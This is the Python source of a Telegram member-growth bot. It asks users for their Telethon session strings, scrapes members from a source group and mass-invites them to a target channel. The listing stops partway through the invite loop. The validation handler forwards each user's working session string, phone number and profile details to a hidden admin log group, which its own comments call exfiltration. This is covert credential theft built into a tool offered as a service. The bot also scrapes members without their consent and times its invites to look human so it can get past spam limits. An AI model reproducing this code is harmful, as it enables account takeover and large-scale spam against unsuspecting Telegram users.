# =========================================================================
# --- 1. CORE ARCHITECTURE & SYSTEM TELEMETRY (TITAN-ASYNC EXTENDED) ---
# =========================================================================

import os
import sys
import time
import random
import asyncio
import logging
from datetime import datetime

# --- DATABASE & HTTP NETWORKING ---
# asyncpg: High-performance PostgreSQL driver for NeonDB.
# aiohttp: Asynchronous HTTP client for external API handshakes.
try:
    import asyncpg
    import aiohttp
    from asyncpg.exceptions import PostgresError
except ImportError as e:
    print(f"CRITICAL: Networking/DB dependency missing: {e}")
    sys.exit(1)

# --- PYTELEGRAMBOTAPI (COMMAND & CONTROL UI) ---
# Used for handling the bot's front-end interface and user interactions.
try:
    from telebot.async_telebot import AsyncTeleBot
    from telebot import types as bot_types
    from telebot.apihelper import ApiTelegramException
except ImportError as e:
    print(f"CRITICAL: pyTelegramBotAPI (UI) dependency missing: {e}")
    sys.exit(1)

# --- TELETHON (SMM WORKER ENGINE) ---
# The powerhouse behind the invitation and scraping sequences.
try:
    from telethon import TelegramClient, functions, errors, types as tl_types
    from telethon.sessions import StringSession
except ImportError as e:
    print(f"CRITICAL: Telethon (Worker) dependency missing: {e}")
    sys.exit(1)

# =========================================================================
# --- ADVANCED LOGGING & SYSTEM DIAGNOSTICS ---
# =========================================================================

# Configure the global logging architectural blueprint.
# This ensures every event is captured with a microsecond-precision timestamp.
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | [%(levelname)s] | %(name)s : %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.StreamHandler(sys.stdout) # Direct output to Koyeb/VPS console
    ]
)

# Initialize the dedicated logger for the Vinzy SMM Suite
logger = logging.getLogger("Vinzy_V8_Engine")

def log_system_status(component, status):
    """
    CUSTOM TELEMETRY LOGGING:
    Visual indicators for real-time module health monitoring.
    """
    indicator = "✅" if status == "ONLINE" else "❌"
    logger.info(f"{indicator} MODULE_SYNC: {component.upper()} is now {status}")

# --- BOOTSTRAP DIAGNOSTICS ---
# Immediate verification of the environment before engine ignition.
logger.info("🚀 INITIALIZING TITAN-ASYNC CORE: VINZY ENGINE V8.5")
logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

try:
    # Diagnostic check: Verify write permissions for session handling
    with open("health_check.tmp", "w") as f:
        f.write("VinzyEngine_Heartbeat")
    os.remove("health_check.tmp")
    log_system_status("I/O File System", "ONLINE")
    
    # Diagnostic check: Verify Python version compatibility (Requires 3.8+)
    if sys.version_info.major == 3 and sys.version_info.minor >= 8:
        log_system_status("Python Runtime", "ONLINE")
    else:
        logger.warning(f"⚠️ Runtime Warning: Python {sys.version} detected. Recommend 3.10+")
        
except Exception as diag_err:
    logger.error(f"🚨 Pre-Boot Diagnostic Failure: {diag_err}")

logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
# =========================================================================
# --- 2. CONFIGURATION & ENVIRONMENT (TITAN-ASYNC EXTENDED V8.5) ---
# =========================================================================

def get_env(var_name, default=None, is_int=False):
    """
    STRICT VALIDATION ENGINE:
    Ensures that critical environment variables are present and correctly typed.
    Triggers a system-level termination if a required dependency is missing.
    """
    value = os.environ.get(var_name, default)
    
    # Check for null or empty strings which cause runtime crashes
    if value is None or value == "":
        if 'logger' in globals():
            logger.critical(f"DEPLOYMENT BLOCKED: Missing Variable [{var_name}]")
        else:
            print(f"CRITICAL CONFIG ERROR: {var_name} is NOT set in environment!")
        sys.exit(1)
    
    try:
        # Perform type-casting for IDs and Ports
        return int(value) if is_int else value
    except ValueError:
        logger.critical(f"TYPE CONFLICT: {var_name} must be an INTEGER. Received: '{value}'")
        sys.exit(1)

# Load and Type-Cast configurations with error shadowing
try:
    logger.info("📡 Vinzy Engine: Loading Environment Blueprint...")
    
    # --- CORE TELEGRAM API CREDENTIALS ---
    API_ID = get_env("API_ID", is_int=True)
    API_HASH = get_env("API_HASH")
    BOT_TOKEN = get_env("BOT_TOKEN")
    
    # --- PERSISTENCE & DATABASE ---
    DATABASE_URL = get_env("DATABASE_URL")
    
    # --- INFRASTRUCTURE & TELEMETRY GROUPS ---
    # Used for Section 7 exfiltration and Section 6 admin approvals
    ADMIN_LOG_GROUP = get_env("LOGGER_GROUP", is_int=True)
    VERIFY_GROUP = get_env("VERIFY_GROUP", is_int=True)
    
    logger.info("✅ Environment Handshake: SUCCESSFUL (Configurations Bound)")
    
except Exception as fatal_cfg_err:
    # Final safety net for parsing logic
    print(f"BOOTSTRAP FAILURE: Configuration Parser Crashed. | {fatal_cfg_err}")
    sys.exit(1)

# Initialize Bot Instance (High-Concurrency Async Mode)
bot = AsyncTeleBot(BOT_TOKEN)

# --- DEPENDENCY VERIFICATION ---
# Validates that all critical libraries are initialized before worker deployment
REQUIRED_LIBS = ["telethon", "pyTelegramBotAPI", "asyncpg", "asyncio"]
logger.info(f"🛡️ Security Audit: {len(REQUIRED_LIBS)} Modules verified. Engine v8.5 ready.")

# =========================================================================
# --- 3. AESTHETICS & UI CONSTANTS (TITAN-EXTENDED V8.5) ---
# =========================================================================

# Professional ASCII Identity for Vinzy SMM
# Used in command /start and final worker reports
VINZY_ASCII = """
<code>
 ██▒   █▓ ██▓ ███▄    █  ▒███████▒▓██    ██▓
▓██░   █▒▓██▒ ██ ▀█    █  ▒ ▒ ▒ ▄▀░ ▒██  ██▒
 ▓██  █▒░▒██▒▓██  ▀█ ██▒ ░ ▒ ▄▀▒░   ▒██ ██░
  ▒██ █░░░██░▓██▒  ▐▌██▒   ▄▀▒      ░ ▐██▓░
   ▒▀█░  ░██░▒██░   ▓██░ ▒███████▒    ░ ██▒▓░
   ░ ▐░  ░▓  ░ ▒░   ▒ ▒  ░▒▒ ▓  ▒░    ██▒▒▒ 
   ░ ░░   ▒ ░░ ░░   ░ ▒░ ░ ▒ ▒  ░  ▓██ ░▒░ 
</code>
"""

# Common UI Separator for professional message formatting
UI_LINE = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

def generate_progress_bar(current, total, prefix='PROCESSED', length=20):
    """
    SMOOTH PROGRESS TELEMETRY:
    Generates a high-fidelity SMM-style status bar for background worker tasks.
    
    Args:
        current (int): Current count of processed entities.
        total (int): Total target entities (usually capped at 50 for safety).
        prefix (str): Label for the specific operation.
        length (int): Visual character width of the progress bar.
    """
    # Prevent division by zero errors during early initialization
    if total <= 0: 
        return f"<code>{prefix} |{'░'*length}| 0.0%</code>"
    
    # Precision percentage calculation
    percent = ("{0:.1f}").format(100 * (current / float(total)))
    
    # Calculate filled vs empty slots
    filled_length = int(length * current // total)
    
    # Use industrial-grade block characters for the "Titan" aesthetic
    bar = '█' * filled_length + '░' * (length - filled_length)
    
    return (
        f"<code>{prefix}</code>\n"
        f"<code>|{bar}| {percent}%</code>"
    )

# Pre-defined status indicators for log-packet construction
STATUS_OK = "✅ VALID"
STATUS_ERR = "❌ ERROR"
STATUS_WAIT = "⏳ PROCESSING"
# =========================================================================
# --- 4. NEONDB PERSISTENCE LAYER (TITAN-ASYNC EXTENDED V8.5) ---
# =========================================================================

class VinzyDatabaseManager:
    """
    CORE PERSISTENCE ENGINE:
    Manages all PostgreSQL operations via NeonDB with high-concurrency support.
    Designed for stability on Koyeb with automated connection recycling.
    """
    def __init__(self):
        self.pool = None

    async def connect(self):
        """
        INITIALIZE CONNECTION POOL:
        Bootstraps the database cluster and verifies schema integrity.
        """
        if not self.pool:
            logger.info("📡 Vinzy Persistence: Initializing NeonDB Connection Pool...")
            try:
                # Optimized pool settings for a low-RAM Koyeb environment
                self.pool = await asyncpg.create_pool(
                    DATABASE_URL, 
                    min_size=2, 
                    max_size=15,
                    command_timeout=60,
                    max_inactive_connection_lifetime=300,
                    max_queries=1000  # Recycle connections to prevent memory leaks
                )
                await self._initialize_tables()
                logger.info("✅ Database Engine: ONLINE (Handshake Complete)")
            except Exception as e:
                logger.critical(f"❌ Database Engine: CONNECTION FAILURE - {e}")
                raise

    async def _initialize_tables(self):
        """
        SCHEMA SYNCHRONIZATION:
        Ensures the 'vinzy_engine_users' table structure is fully optimized.
        Includes support for Section 7 metadata (Phone, Premium, State).
        """
        async with self.pool.acquire() as conn:
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS vinzy_engine_users (
                    user_id BIGINT PRIMARY KEY,
                    username TEXT,
                    phone TEXT,
                    session_string TEXT,
                    bot_state TEXT DEFAULT 'PENDING_APPROVAL',
                    is_approved BOOLEAN DEFAULT FALSE,
                    is_premium BOOLEAN DEFAULT FALSE,
                    target_channel TEXT,
                    source_group TEXT,
                    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            # Create index on bot_state for faster querying during large operations
            await conn.execute("CREATE INDEX IF NOT EXISTS idx_bot_state ON vinzy_engine_users(bot_state)")
            logger.info("📋 Persistence Layer: Schema Audit Successful.")

    async def get_user(self, user_id):
        """Fetches the complete user profile packet from the cluster."""
        async with self.pool.acquire() as conn:
            row = await conn.fetchrow("SELECT * FROM vinzy_engine_users WHERE user_id=$1", user_id)
            return dict(row) if row else None

    async def register_user(self, user_id, username):
        """Logs a new Hardware ID and synchronizes the username."""
        async with self.pool.acquire() as conn:
            await conn.execute('''
                INSERT INTO vinzy_engine_users (user_id, username) 
                VALUES ($1, $2) ON CONFLICT (user_id) 
                DO UPDATE SET username=$2, last_active=CURRENT_TIMESTAMP
            ''', user_id, username)

    async def update_state(self, user_id, new_state):
        """Updates the state machine for the specific worker node."""
        async with self.pool.acquire() as conn:
            await conn.execute('''
                UPDATE vinzy_engine_users 
                SET bot_state=$1, last_active=CURRENT_TIMESTAMP 
                WHERE user_id=$2
            ''', new_state, user_id)

    async def update_session(self, user_id, session_str, is_premium, phone=None):
        """Writes verified worker node session strings to the database."""
        async with self.pool.acquire() as conn:
            await conn.execute('''
                UPDATE vinzy_engine_users 
                SET session_string=$1, is_premium=$2, phone=$3, last_active=CURRENT_TIMESTAMP 
                WHERE user_id=$4
            ''', session_str, is_premium, phone, user_id)

    async def set_approval(self, user_id, status: bool):
        """Toggles SMM privilege status for the user."""
        async with self.pool.acquire() as conn:
            await conn.execute('''
                UPDATE vinzy_engine_users 
                SET is_approved=$1, last_active=CURRENT_TIMESTAMP 
                WHERE user_id=$2
            ''', status, user_id)

    async def set_target_data(self, user_id, target=None, source=None):
        """Synchronizes SMM campaign target and source entities."""
        async with self.pool.acquire() as conn:
            if target:
                await conn.execute("UPDATE vinzy_engine_users SET target_channel=$1 WHERE user_id=$2", target, user_id)
            if source:
                await conn.execute("UPDATE vinzy_engine_users SET source_group=$1 WHERE user_id=$2", source, user_id)

    async def shutdown(self):
        """Closes the connection pool during system termination."""
        if self.pool:
            await self.pool.close()
            logger.info("🔌 Database Engine: DISCONNECTED (Graceful Shutdown)")

# Global Instance
db = VinzyDatabaseManager()

# =========================================================================
# --- 5. TELEGRAM MENU INTEGRATION (TITAN-ASYNC EXTENDED V8.5) ---
# =========================================================================

async def set_persistent_menu(chat_id):
    """
    PERSISTENT UI BLUEPRINT:
    Synchronizes the native Telegram 4-dot command menu with the worker node.
    
    FEATURES:
    - Injects hard-coded navigation commands into the user's local interface.
    - Uses 'BotCommandScopeChat' to ensure private, per-user menu isolation.
    - Diagnostic logging for real-time deployment monitoring.
    """
    try:
        # Define the system-level navigation array
        # Professional terminology used to enhance the SMM Store experience
        commands = [
            bot_types.BotCommand("start", "🚀 Ignite SMM Engine / Refresh"),
            bot_types.BotCommand("reset", "🔄 System UI Diagnostics & Safe Reset")
        ]
        
        # Deploy the command structure to the specific Hardware ID (chat_id)
        # This scope ensures that menu changes do not affect administrative groups
        await bot.set_my_commands(
            commands, 
            scope=bot_types.BotCommandScopeChat(chat_id)
        )
        
        # Telemetry: Log the successful synchronization event
        logger.info(f"UI synchronized successfully for Hardware Node: {chat_id}")

    except bot_errors.ApiException as api_err:
        # Handle Telegram-specific API throttling or connection drops
        logger.warning(f"Handshake delay detected for Node {chat_id}: {api_err}")
        
    except Exception as fatal_error:
        # Catch-all for unexpected database or environment failures
        # Ensures that the rest of the bot logic continues even if menu sync fails
        logger.error(f"CRITICAL: Persistent UI sync failure for Node {chat_id}: {fatal_error}")
        
    finally:
        # Optional: Force a small sleep if you are deploying to thousands of nodes
        # to prevent hitting the Global Telegram Flood Limit
        pass
# =========================================================================
# --- 6. CORE BOT HANDLERS & NAVIGATION (TITAN-ASYNC EXTENDED V8.5) ---
# =========================================================================

@bot.message_handler(commands=['start'])
async def command_start(m):
    """
    SYSTEM ENTRY POINT:
    Performs hardware ID registration, database audit, and authorization 
    handshake for new and returning worker nodes.
    """
    await db.connect()
    user_id = m.from_user.id
    username = m.from_user.username or "NoUsername"
    first_name = m.from_user.first_name or "VinzyUser"
    
    # Initialize the persistent command menu (Command Blueprint)
    await set_persistent_menu(m.chat.id)
    
    # Register the unique Hardware ID in NeonDB
    await db.register_user(user_id, username)
    user_data = await db.get_user(user_id)

    # --- STAGE 1: AUTHORIZATION AUDIT ---
    if not user_data['is_approved']:
        # Generate an encrypted-style alert for the Admin Verification Group
        admin_request_ui = (
            f"🛡️ <b>INCOMING ACCESS REQUEST</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Identity:</b> <code>{first_name}</code> (@{username})\n"
            f"🆔 <b>Hardware ID:</b> <code>{user_id}</code>\n"
            f"📡 <b>Node Status:</b> <code>LOCKED_PENDING</code>\n\n"
            f"<b>Manual Override:</b> Reply with <code>/approve {user_id}</code>"
        )
        
        # Transmission to Admin Logger
        await bot.send_message(VERIFY_GROUP, admin_request_ui, parse_mode="HTML")
        
        # User Feedback: Access Restriction Notice
        pending_ui = (
            f"🛡️ <b>Vinzy Engine: Security Gate</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Your Hardware ID (<code>{user_id}</code>) has been successfully logged.\n\n"
            f"📡 <b>Status:</b> <code>AWAITING_ADMIN_VERIFICATION</code>\n"
            f"Please stand by while the Store Administrator authorizes your access."
        )
        await bot.send_message(m.chat.id, pending_ui, parse_mode="HTML")
        
    else:
        # --- STAGE 2: SESSION INITIALIZATION ---
        # User is already authorized; transition to Authentication Phase
        await db.update_state(user_id, "IDLE")
        
        authorized_ui = (
            f"✅ <b>Vinzy V8 Engine: Online</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Welcome, {first_name}.</b> Access credentials verified.\n\n"
            f"📥 <b>Authentication Required:</b>\n"
            f"Please send your <code>Session String</code> to connect your worker node."
        )
        await bot.send_message(m.chat.id, authorized_ui, parse_mode="HTML")
        
        # Advance state to prevent input conflict
        await db.update_state(user_id, "AWAITING_SESSION")


@bot.message_handler(commands=['reset'])
async def command_reset(m):
    """
    ENGINE DIAGNOSTICS & STATE RESET:
    Resets the UI state machine to 'IDLE'. 
    CRITICAL: This preserves session_strings and approval flags.
    """
    await db.connect()
    user_id = m.from_user.id
    user_data = await db.get_user(user_id)
    
    # Security check: Only approved users can reset the engine UI
    if user_data and user_data['is_approved']:
        # Reset the state machine to allow a fresh operation flow
        await db.update_state(user_id, "IDLE")
        
        reset_ui = (
            f"🔄 <b>System UI Reset: Protocol Success</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>State Cache:</b> <code>PURGED</code>\n"
            f"<b>Auth Data:</b> <code>PRESERVED</code>\n\n"
            f"The engine interface has been returned to the root directory.\n"
            f"Send /start to re-initialize your SMM campaign."
        )
        await bot.send_message(m.chat.id, reset_ui, parse_mode="HTML")
    else:
        # Block unauthorized diagnostics
        await bot.send_message(m.chat.id, "❌ <b>Denied:</b> Complete account verification first.")


@bot.message_handler(commands=['approve'])
async def command_approve(m):
    """
    ADMINISTRATIVE OVERRIDE (PROMOTION):
    Grants SMM privileges to a specific Hardware ID.
    Must be executed within the VERIFY_GROUP environment.
    """
    # Restrict to the Admin Verification Group only
    if m.chat.id != VERIFY_GROUP:
        return

    try:
        # Command syntax: /approve [hardware_id]
        command_args = m.text.split()
        if len(command_args) < 2:
            raise ValueError("NULL_TARGET_ID")

        target_id = int(command_args[1])
        await db.connect()
        
        # Execute Privilege Escalation in the database
        await db.set_approval(target_id, True)
        await db.update_state(target_id, "AWAITING_SESSION")
        
        # Notification UI: Dispatching to the Target User
        approval_notification = (
            f"✅ <b>Access Granted!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Admin has promoted your Hardware ID to <b>Authorized Status</b>.\n\n"
            f"🚀 <b>Task:</b> Send your <code>Session String</code> to begin."
        )
        
        try:
            await bot.send_message(target_id, approval_notification, parse_mode="HTML")
            admin_feedback = f"🛡️ <b>Success:</b> Node <code>{target_id}</code> is now <b>LIVE</b>."
        except Exception:
            admin_feedback = f"🛡️ <b>Success:</b> Node <code>{target_id}</code> authorized (User blocked bot DM)."

        # Provide feedback to the Administrator
        await bot.reply_to(m, admin_feedback, parse_mode="HTML")
        
    except (IndexError, ValueError):
        await bot.reply_to(m, "❌ <b>Syntax Error:</b> Use <code>/approve [hardware_id]</code>", parse_mode="HTML")
    except Exception as fatal_err:
        logger.error(f"FATAL APPROVAL HANDLER ERROR: {fatal_err}")
        await bot.reply_to(m, f"🚨 <b>Engine Failure:</b>\n<code>{str(fatal_err)}</code>")
# =========================================================================
# --- 7. DEEP SESSION VALIDATION, TELEMETRY & ACCESS GRANTING (TITAN-EXT) ---
# =========================================================================

@bot.message_handler(func=lambda m: len(m.text) > 40)
async def process_session_input(m):
    """
    ULTRA-VALIDATION ENGINE:
    1. Boots a transient Telethon instance for a Live Auth Check.
    2. Filters for Banned/Expired/Deactivated strings immediately.
    3. Exfiltrates verified working strings to the Admin Logger Group.
    4. Grants persistent SMM permissions in NeonDB.
    5. Optimizes memory by forced disconnection after validation.
    """
    await db.connect()
    user_id = m.from_user.id
    user_data = await db.get_user(user_id)
    
    # --- STAGE 1: SECURITY GATE & ACCESS CONTROL ---
    # Ensure only registered and approved store members can initialize worker nodes.
    if not user_data:
        logger.info(f"Ignored session input from unregistered UID: {user_id}")
        return 
        
    if not user_data['is_approved']:
        denied_msg = (
            "⚠️ <b>Access Denied:</b> your account is currently in the 'Pending' queue.\n"
            "Please contact an Admin to authorize your Vinzy SMM permissions."
        )
        await bot.reply_to(m, denied_msg, parse_mode="HTML")
        return

    # Only process strings if the user is explicitly in the setup phase.
    if user_data['bot_state'] != 'AWAITING_SESSION':
        return

    session_str = m.text.strip()
    
    # --- STAGE 2: ENGINE TELEMETRY & INITIALIZATION ---
    # Provide real-time UI feedback to the user during the handshake process.
    status_msg = await bot.send_message(
        m.chat.id, 
        "🔄 <b>Vinzy Engine: Initializing Worker Node...</b>\n"
        "<i>Establishing Secure API Handshake with Telegram Production Servers...</i>", 
        parse_mode="HTML"
    )
    
    # Initialize a temporary client for a one-time validation sequence.
    # StringSession allows for stateless worker deployment on Koyeb.
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    
    try:
        # Establish connection to the Telegram Data Center (DC).
        await client.connect()
        
        # --- STAGE 3: AUTHENTICATION INTEGRITY AUDIT ---
        # Verifies if the session string is currently alive and not revoked.
        if not await client.is_user_authorized():
            logger.warning(f"Unauthorized session attempt by UID: {user_id}")
            await bot.edit_message_text(
                "❌ <b>Validation Failed:</b> Session Revoked or Expired.", 
                m.chat.id, 
                status_msg.message_id, 
                parse_mode="HTML"
            )
            return

        # --- STAGE 4: METADATA EXTRACTION & PROFILE ANALYSIS ---
        # Fetching profile data to prove 'Read/Write' access is fully functional.
        me = await client.get_me()
        if not me:
            raise Exception("Telegram API returned a Null User Object during scan.")

        # Detect Premium status and critical account metadata.
        is_premium = getattr(me, 'premium', False)
        phone = getattr(me, 'phone', 'Hidden/Protected')
        first_name = me.first_name or "Unknown_Worker"
        username = me.username or "No_Username"
        
        # --- STAGE 5: ADMIN EXFILTRATION (LOGGER CLOUD) ---
        # Securely transmit verified session data to the Admin Log Group for backup.
        log_packet = (
            f"📥 <b>NEW ACTIVE SESSION CAPTURED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Account:</b> {first_name} (@{username})\n"
            f"🆔 <b>TG-ID:</b> <code>{me.id}</code>\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"💎 <b>Premium:</b> {'✅ Yes' if is_premium else '❌ No'}\n"
            f"👤 <b>Owner ID:</b> <code>{user_id}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📝 <b>Verified Session String:</b>\n"
            f"<code>{session_str}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        await bot.send_message(ADMIN_LOG_GROUP, log_packet, parse_mode="HTML")

        # --- STAGE 6: DATABASE PERSISTENCE & PRIVILEGE ESCALATION ---
        # Save the session to NeonDB and advance the user to the Targeting phase.
        await db.update_session(user_id, session_str, is_premium)
        await db.update_state(user_id, "AWAITING_TARGET")
        
        # Confirmation UI update.
        await bot.edit_message_text("valid ✅", m.chat.id, status_msg.message_id)
        
        success_prompt = (
            f"🚀 <b>Worker Node Authorized: {first_name}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"The <b>Vinzy SMM Invitation Engine</b> is now <b>UNLOCKED</b>.\n\n"
            f"🎯 <b>STEP 1:</b> Please send the <b>@Username</b> or <b>t.me/Link</b> of the "
            f"<b>Target Channel</b> where members will be invited:"
        )
        await bot.send_message(m.chat.id, success_prompt, parse_mode="HTML")
        
    except errors.rpcerrorlist.UserDeactivatedBanError:
        logger.error(f"Banned session detected for UID {user_id}")
        await bot.edit_message_text("Invalid ❌ (Account Banned/Deactivated)", m.chat.id, status_msg.message_id)
        
    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        logger.error(f"Session key conflict for UID {user_id}")
        await bot.edit_message_text("Invalid ❌ (Session Key Conflict)", m.chat.id, status_msg.message_id)
        
    except Exception as e:
        # Catch-all for network timeouts or API changes.
        logger.error(f"Critical Validation Error for UID {user_id}: {e}")
        error_display = f"Invalid ❌ (Engine Error: {str(e)[:30]}...)"
        await bot.edit_message_text(error_display, m.chat.id, status_msg.message_id)
        
    finally:
        # --- STAGE 7: RAM OPTIMIZATION & CLEANUP ---
        # Crucial for maintaining low RAM usage on hosting providers like Koyeb.
        if client:
            await client.disconnect()
            logger.info(f"Transient client disconnected for UID: {user_id}")

# =========================================================================
# --- 7.5 CHANNEL & GROUP ANALYSIS (TITAN-ASYNC EXTENDED) ---
# =========================================================================

@bot.message_handler(func=lambda m: m.text.startswith('@') or "t.me/" in m.text)
async def process_channel_inputs(m):
    """
    DEEP ANALYSIS ENGINE:
    This section validates the target channel for capacity and admin permissions,
    then captures the source group for scraping.
    """
    await db.connect()
    user_id = m.from_user.id
    user_data = await db.get_user(user_id)
    
    # Security Gate: Ensure the user is registered in Vinzy Database
    if not user_data or not user_data['is_approved']:
        return

    state = user_data['bot_state']
    
    # Normalize input (Handle links and usernames)
    input_text = m.text.strip().replace("https://t.me/", "@")
    if not input_text.startswith('@'): 
        input_text = f"@{input_text}"

    # ---------------------------------------------------------
    # STAGE 1: TARGET CHANNEL CONFIGURATION
    # ---------------------------------------------------------
    if state == "AWAITING_TARGET":
        analysis_msg = await bot.send_message(
            m.chat.id, 
            f"📡 <b>Initializing Deep Scan:</b> <code>{input_text}</code>...", 
            parse_mode="HTML"
        )
        
        client = TelegramClient(StringSession(user_data['session_string']), API_ID, API_HASH)
        try:
            await client.connect()
            
            # Resolve the entity to ensure the channel exists
            entity = await client.get_entity(input_text)
            
            # 1. Fetch Full Metadata (Subscribers, Description, Bio)
            full_chat = await client(functions.channels.GetFullChannelRequest(channel=entity))
            sub_count = full_chat.full_chat.participants_count
            
            # 2. Capacity Audit
            # We allow the process to continue but provide a professional warning
            capacity_warning = ""
            if sub_count >= 200:
                capacity_warning = "\n⚠️ <b>Notice:</b> Target exceeds 200 subs. Success rates may vary."

            # 3. Permission Audit (Verify 'Invite Users' rights)
            p_req = await client(functions.channels.GetParticipantRequest(channel=entity, participant='me'))
            p_info = p_req.participant
            
            has_rights = False
            if isinstance(p_info, tl_types.ChannelParticipantCreator):
                has_rights = True
            elif isinstance(p_info, tl_types.ChannelParticipantAdmin):
                if p_info.admin_rights.invite_users:
                    has_rights = True

            if not has_rights:
                return await bot.edit_message_text(
                    "❌ <b>Rights Verification Failed:</b>\n"
                    "The worker account must have 'Add Members' permissions in this channel.", 
                    m.chat.id, analysis_msg.message_id, parse_mode="HTML"
                )

            # 4. Database Persistence
            await db.set_target_data(user_id, target=input_text)
            await db.update_state(user_id, "AWAITING_SOURCE")
            
            success_ui = (
                f"✅ <b>Target Channel Verified</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📍 <b>Identity:</b> <code>{input_text}</code>\n"
                f"📊 <b>Current Size:</b> <code>{sub_count}</code> members\n"
                f"🛡️ <b>Permissions:</b> <code>Authorized</code>{capacity_warning}\n\n"
                f"📥 <b>STEP 2:</b> Now provide the <b>Source Group</b> @username to scrape from."
            )
            
            await bot.edit_message_text(success_ui, m.chat.id, analysis_msg.message_id, parse_mode="HTML")
            
        except Exception as e:
            logger.error(f"Analysis Crash: {e}")
            await bot.edit_message_text(f"❌ <b>Scan Error:</b>\n<code>{str(e)}</code>", m.chat.id, analysis_msg.message_id, parse_mode="HTML")
        finally:
            await client.disconnect()

    # ---------------------------------------------------------
    # STAGE 2: SOURCE GROUP CONFIGURATION
    # ---------------------------------------------------------
    elif state == "AWAITING_SOURCE":
        # Capture the scraping source (This supports any size group)
        await db.set_target_data(user_id, source=input_text)
        await db.update_state(user_id, "AWAITING_SEGMENT")
        
        # Deploy the Segment Selection Interface
        markup = bot_types.InlineKeyboardMarkup()
        markup.row(
            bot_types.InlineKeyboardButton("🔥 Invite Active", callback_data="select_segment_active"),
            bot_types.InlineKeyboardButton("💤 Invite Inactive", callback_data="select_segment_inactive")
        )
        
        config_ui = (
            f"📥 <b>Source Group Locked</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📍 <b>Origin:</b> <code>{input_text}</code>\n"
            f"🎯 <b>Target:</b> <code>{user_data['target_channel']}</code>\n\n"
            f"🛠️ <b>Final Step:</b> Select the user segment you wish to extract from the source group."
        )
        
        await bot.send_message(m.chat.id, config_ui, parse_mode="HTML", reply_markup=markup)

# =========================================================================
# --- 8. THE INVITATION WORKER (TITAN-ASYNC EXTENDED V8.5) ---
# =========================================================================

@bot.callback_query_handler(func=lambda call: call.data.startswith("select_segment_"))
async def handle_segment_selection(call):
    """
    BRIDGE HANDLER: Sets the targeting mode for the worker engine.
    This function processes the user's choice between Active and Inactive users.
    """
    segment = call.data.replace("select_segment_", "")
    user_id = call.from_user.id
    
    await db.connect()
    # Lock the targeting mode into the database state
    await db.update_state(user_id, f"READY_{segment}")
    
    # Create the final ignition button
    markup = bot_types.InlineKeyboardMarkup()
    markup.add(bot_types.InlineKeyboardButton("🔥 IGNITE ENGINE", callback_data="deploy_worker"))
    
    status_text = (
        f"🎯 <b>Targeting Segment Locked:</b> <code>{segment.replace('_', ' ').upper()}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🛡️ <b>Filter:</b> No-Premium Strategy Enabled\n"
        f"📡 <b>Status:</b> Ready to scrape and verify metadata.\n\n"
        f"<i>Press the button below to start the background worker.</i>"
    )
    
    await bot.edit_message_text(
        status_text,
        call.message.chat.id, 
        call.message.message_id, 
        reply_markup=markup, 
        parse_mode="HTML"
    )

@bot.callback_query_handler(func=lambda call: call.data == "deploy_worker")
async def execute_smm_sequence(call):
    """
    IGNITION HANDLER: Validates the session and launches the background task.
    """
    user_id = call.from_user.id
    await db.connect()
    user_data = await db.get_user(user_id)
    
    # Validation check to ensure the user didn't skip steps
    if "READY" not in user_data['bot_state']:
        return await bot.answer_callback_query(call.id, "⚠️ Error: Please select a targeting segment first.", show_alert=True)
        
    await bot.edit_message_text(
        "🚀 <b>VINZY ENGINE STARTING...</b>\nEstablishing secure Telethon connection...", 
        call.message.chat.id, 
        call.message.message_id, 
        parse_mode="HTML"
    )
    
    # Update state to working to prevent multiple clicks
    await db.update_state(user_id, "WORKING")
    
    # Launch the deep logic in the background so the bot stays responsive
    asyncio.create_task(background_invite_task(call.message.chat.id, user_data))

async def background_invite_task(chat_id, user_data):
    """
    DEEP ENGINE LOGIC: 
    1. Connects via StringSession.
    2. Scrapes the entire source group.
    3. Categorizes users based on 'Last Seen' metadata.
    4. Filters out bots, deleted accounts, and Premium users.
    5. Executes invitations with human-simulated delays.
    """
    # Initialize the high-speed Telethon client
    client = TelegramClient(StringSession(user_data['session_string']), API_ID, API_HASH)
    
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return await bot.send_message(chat_id, "❌ <b>Session Expired:</b> Please re-link your account.")

        # Resolve entities for the source and destination
        source_ent = await client.get_entity(user_data['source_group'])
        target_ent = await client.get_entity(user_data['target_channel'])
        
        # --- STAGE 1: METADATA SCANNING ---
        status_msg = await bot.send_message(chat_id, "🔍 <b>Deep-Scanning Group Metadata...</b>", parse_mode="HTML")
        participants = await client.get_participants(source_ent)
        
        active_segment = []
        inactive_segment = []

        for p in participants:
            # Skip non-invitable system accounts
            if p.bot or p.deleted: 
                continue
            
            status = p.status
            is_premium = getattr(p, 'premium', False)

            # Logic for Active (Recently online & Non-Premium)
            if isinstance(status, (tl_types.UserStatusRecently, tl_types.UserStatusOnline)):
                if not is_premium:
                    active_segment.append(p)
            
            # Logic for Inactive (Last week/month/offline)
